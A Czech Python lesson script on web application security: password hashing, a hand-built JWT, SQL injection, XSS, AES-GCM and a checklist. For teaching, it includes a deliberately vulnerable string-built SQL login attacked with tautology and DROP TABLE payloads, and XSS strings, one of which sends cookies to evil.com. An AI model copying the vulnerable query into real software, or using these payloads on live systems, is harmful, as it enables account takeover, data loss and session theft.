"""
LEKCE 68: Security – bezpečnost Python aplikací
=================================================
pip install cryptography passlib[bcrypt] python-jose

Témata:
  Hesla      – hashing (bcrypt), nikdy plaintext
  JWT        – JSON Web Tokens, autentizace bez session
  SQL inject – jak vzniká a jak se bránit
  XSS / CSRF – webové útoky a obrana
  Secrets    – správa tajemství
  Kryptografie – AES, RSA, HMAC

Zlatá pravidla:
  1. Nikdy neskladuj hesla v plaintextu
  2. Nikdy nenacházej SQL z user inputu (parametrizované dotazy!)
  3. Vždy validuj vstup na straně serveru
  4. HTTPS všude (TLS/SSL)
  5. Secrets v env proměnných, nikdy v kódu
"""

import hashlib
import hmac
import secrets
import base64
import json
import time
import re
import sqlite3
import html
from pathlib import Path
from datetime import datetime, timedelta

# ══════════════════════════════════════════════════════════════
# ČÁST 1: Hesla – správné hašování
# ══════════════════════════════════════════════════════════════

print("=== Hesla – hašování ===\n")

# ŠPATNĚ – nikdy takhle!
def spatne_uloz_heslo(heslo: str) -> str:
    return heslo   # plaintext → okamžité kompromitování při úniku DB

def spatne_hash(heslo: str) -> str:
    return hashlib.md5(heslo.encode()).hexdigest()   # MD5 je prolomen!

# SPRÁVNĚ – bcrypt přes stdlib (Python 3.13+) nebo passlib
def spravne_hash_heslo(heslo: str) -> tuple[str, str]:
    """PBKDF2-SHA256 – bezpečný, vestavěný."""
    sul = secrets.token_hex(16)
    klíč = hashlib.pbkdf2_hmac(
        "sha256",
        heslo.encode("utf-8"),
        sul.encode(),
        iterations=600_000,   # NIST doporučení 2024
    )
    return sul, klíč.hex()

def over_heslo(heslo: str, sul: str, ulozeny_hash: str) -> bool:
    klíč = hashlib.pbkdf2_hmac(
        "sha256", heslo.encode(), sul.encode(), iterations=600_000
    )
    # secrets.compare_digest – odolný vůči timing útokům!
    return secrets.compare_digest(klíč.hex(), ulozeny_hash)

# Demo
hesla = ["tajneHeslo123!", "password", "Tr0ub4dor&3", "correcthorsebatterystaple"]
print(f"{'Heslo':<30} {'MD5 (ŠPATNĚ)':<35} {'PBKDF2 bezpečnost'}")
print("─" * 80)
for h in hesla:
    md5 = hashlib.md5(h.encode()).hexdigest()[:20] + "..."
    sul, pbkdf2 = spravne_hash_heslo(h)
    overeno = over_heslo(h, sul, pbkdf2)
    print(f"  {h:<28} {md5:<35} ✓ ověřeno={overeno}")

# Timing útok demo
print(f"\nTiming útok – proč secrets.compare_digest:")
tajny = "spravne-heslo"
print(f"  == operátor zastaví při první neshode → útočník změří čas")
print(f"  compare_digest vždy porovná VŠE → konstantní čas")


# ══════════════════════════════════════════════════════════════
# ČÁST 2: JWT – JSON Web Tokens
# ══════════════════════════════════════════════════════════════

print("\n=== JWT – JSON Web Tokens ===\n")

class JWT:
    """Minimální JWT implementace (HMAC-SHA256)."""

    def __init__(self, tajny_klic: str):
        self.klic = tajny_klic.encode()

    def _b64url(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_decode(self, s: str) -> bytes:
        pad = 4 - len(s) % 4
        return base64.urlsafe_b64decode(s + "=" * (pad % 4))

    def vydej(self, payload: dict, expirace_min: int = 30) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            **payload,
            "iat": int(time.time()),
            "exp": int(time.time()) + expirace_min * 60,
        }
        h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url(json.dumps(payload, separators=(",", ":")).encode())
        zprava = f"{h}.{p}".encode()
        podpis = hmac.new(self.klic, zprava, hashlib.sha256).digest()
        s = self._b64url(podpis)
        return f"{h}.{p}.{s}"

    def over(self, token: str) -> dict:
        try:
            h, p, s = token.split(".")
        except ValueError:
            raise ValueError("Neplatný formát JWT")

        # Ověř podpis
        zprava   = f"{h}.{p}".encode()
        ocekavany = hmac.new(self.klic, zprava, hashlib.sha256).digest()
        prijaty   = self._b64url_decode(s)
        if not secrets.compare_digest(ocekavany, prijaty):
            raise ValueError("Neplatný podpis JWT")

        payload = json.loads(self._b64url_decode(p))

        # Ověř expiraci
        if payload.get("exp", 0) < time.time():
            raise ValueError("JWT vypršel")

        return payload

jwt = JWT(secrets.token_hex(32))

# Vydej token
token = jwt.vydej({"user_id": 1, "jmeno": "Míša", "role": "student"})
print(f"Token ({len(token)} znaků):")
print(f"  {token[:50]}...")
print(f"  Části: {token.count('.')} tečky = header.payload.signature")

# Ověř
payload = jwt.over(token)
print(f"\nOvěřený payload: {payload}")
print(f"  Vyprší za: {(payload['exp'] - time.time())/60:.0f} min")

# Pokus o falšování
print("\nFalšování tokenu:")
části = token.split(".")
falsovany_payload = base64.urlsafe_b64encode(
    json.dumps({"user_id": 99, "role": "admin"}).encode()
).rstrip(b"=").decode()
falsovany_token = f"{části[0]}.{falsovany_payload}.{části[2]}"
try:
    jwt.over(falsovany_token)
except ValueError as e:
    print(f"  ✓ Odmítnuto: {e}")


# ══════════════════════════════════════════════════════════════
# ČÁST 3: SQL Injection
# ══════════════════════════════════════════════════════════════

print("\n=== SQL Injection ===\n")

# Vytvoř testovací DB
conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE uzivatele (id INTEGER PRIMARY KEY, jmeno TEXT, heslo TEXT, admin INTEGER)")
conn.execute("INSERT INTO uzivatele VALUES (1,'admin','tajne',1)")
conn.execute("INSERT INTO uzivatele VALUES (2,'misa','heslo',0)")
conn.commit()

# ŠPATNĚ – vulnerability!
def spatny_login(jmeno: str, heslo: str) -> bool:
    sql = f"SELECT * FROM uzivatele WHERE jmeno='{jmeno}' AND heslo='{heslo}'"
    print(f"  SQL: {sql}")
    return bool(conn.execute(sql).fetchone())

# SPRÁVNĚ – parametrizované dotazy
def spravny_login(jmeno: str, heslo: str) -> bool:
    sql = "SELECT * FROM uzivatele WHERE jmeno=? AND heslo=?"
    print(f"  SQL: {sql}  params=({jmeno!r}, {heslo!r})")
    return bool(conn.execute(sql, (jmeno, heslo)).fetchone())

print("Normální přihlášení:")
print(f"  ŠPATNĚ: {spatny_login('admin', 'tajne')}")
print(f"  SPRÁVNĚ: {spravny_login('admin', 'tajne')}")

print("\nSQL Injection útok: jmeno=\"' OR '1'='1\" heslo=\"anything\"")
zlobivý_vstup = "' OR '1'='1"
print(f"  ŠPATNĚ: {spatny_login(zlobivý_vstup, 'anything')}  ← PŘIHLÁSÍ KOHOKOLI!")
print(f"  SPRÁVNĚ: {spravny_login(zlobivý_vstup, 'anything')}  ← bezpečně odmítnuto")

print("\nSQL Injection – DROP TABLE:")
destruktivni = "'; DROP TABLE uzivatele; --"
try:
    spatny_login(destruktivni, "x")
    print("  ŠPATNĚ: Dotaz prošel!")
except Exception as e:
    print(f"  Chyba (ale DB může být poškozena): {e}")
print(f"  SPRÁVNĚ: {spravny_login(destruktivni, 'x')}  ← nic se nestalo")


# ══════════════════════════════════════════════════════════════
# ČÁST 4: XSS a input sanitizace
# ══════════════════════════════════════════════════════════════

print("\n=== XSS – Cross-Site Scripting ===\n")

# Útočník vloží JavaScript do vstupu
xss_pokusy = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="stealCookies()">',
    'javascript:void(0)',
    '<a href="javascript:evil()">Klikni</a>',
    '"><script>document.location="evil.com?c="+document.cookie</script>',
]

print("XSS vstupy a jejich neutralizace:")
for vstup in xss_pokusy:
    escapovano = html.escape(vstup)
    print(f"  Vstup:    {vstup[:60]}")
    print(f"  Escaped:  {escapovano[:60]}\n")

def sanitizuj_vstup(text: str, max_delka: int = 500) -> str:
    """Kombinovaná sanitizace."""
    text = text[:max_delka]              # limituj délku
    text = text.strip()                  # ořeže whitespace
    text = html.escape(text)             # escapuj HTML
    text = re.sub(r"javascript:", "", text, flags=re.IGNORECASE)
    return text

print("Sanitizovaný komentář uživatele:")
spatny_komentar = '<script>alert(1)</script>Ahoj! <b>Tučné</b>'
print(f"  Vstup:  {spatny_komentar!r}")
print(f"  Výstup: {sanitizuj_vstup(spatny_komentar)!r}")


# ══════════════════════════════════════════════════════════════
# ČÁST 5: Kryptografie – AES šifrování
# ══════════════════════════════════════════════════════════════

print("\n=== Symetrické šifrování (AES-GCM) ===\n")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    # Generuj klíč (256 bit)
    klic = AESGCM.generate_key(bit_length=256)
    aes  = AESGCM(klic)

    def sifrovany_zaznam(data: dict) -> bytes:
        nonce   = secrets.token_bytes(12)   # 96 bit nonce
        plaintext = json.dumps(data, ensure_ascii=False).encode()
        sifrovano = aes.encrypt(nonce, plaintext, None)
        return nonce + sifrovano

    def desifrovany_zaznam(raw: bytes) -> dict:
        nonce     = raw[:12]
        sifrovano = raw[12:]
        plaintext = aes.decrypt(nonce, sifrovano, None)
        return json.loads(plaintext)

    data = {"user_id": 1, "role": "admin", "expires": "2025-12-31"}
    zasifrovano = sifrovany_zaznam(data)
    print(f"  Plaintext: {data}")
    print(f"  Šifrováno: {zasifrovano.hex()[:60]}... ({len(zasifrovano)} B)")
    desifrovano = desifrovany_zaznam(zasifrovano)
    print(f"  Dešifrováno: {desifrovano}")

    # Ověření integrity (AEAD – autentizované šifrování)
    print("\n  Pokus o manipulaci se zašifrovanými daty:")
    spatna_data = bytearray(zasifrovano)
    spatna_data[15] ^= 0xFF   # změň jeden bit
    try:
        desifrovany_zaznam(bytes(spatna_data))
    except Exception as e:
        print(f"  ✓ Manipulace odhalena: {type(e).__name__}")

except ImportError:
    print("  cryptography není nainstalováno: pip install cryptography")
    print("  (Ukázka AES-GCM šifrování přeskočena)")


# ══════════════════════════════════════════════════════════════
# ČÁST 6: Security checklist
# ══════════════════════════════════════════════════════════════

print("""
=== Security checklist pro Python aplikace ===

  Hesla:
    ✓ bcrypt/Argon2/PBKDF2 – NIKDY MD5/SHA1 bez soli
    ✓ secrets.compare_digest() – odolný vůči timing útokům
    ✓ Minimální délka 12 znaků, kombinace

  Autentizace:
    ✓ JWT s krátkým TTL (15-60 min) + refresh tokeny
    ✓ HTTPS only – cookies s Secure + HttpOnly + SameSite
    ✓ Rate limiting na login endpoint
    ✓ 2FA pro admin účty

  Databáze:
    ✓ Parametrizované dotazy (nikdy f-string do SQL!)
    ✓ Minimální oprávnění DB uživatele
    ✓ Šifrování citlivých sloupců (PII data)

  API:
    ✓ Input validace na serveru (Pydantic!)
    ✓ Sanitizace výstupu (html.escape)
    ✓ Security headers (CORS, CSP, HSTS, X-Frame-Options)
    ✓ Skrýt detailní chybové zprávy v produkci

  Secrets:
    ✓ Env variables nebo vault (nikdy v kódu/gitu)
    ✓ Rotace klíčů
    ✓ Audit log přístupů k secrets

  Závislosti:
    ✓ pip audit – kontrola CVE
    ✓ Dependabot / Renovate – automatické updates
    ✓ Pinning verzí v requirements.txt
""")

conn.close()

# TVOJE ÚLOHA:
# 1. Přidej TOTP (Time-based OTP) pro 2FA – pyotp knihovna.
# 2. Napiš middleware který přidá security headers do FastAPI odpovědí.
# 3. Implementuj brute-force ochranu: po 5 neúspěšných loginech zablokuj IP na 15 min.
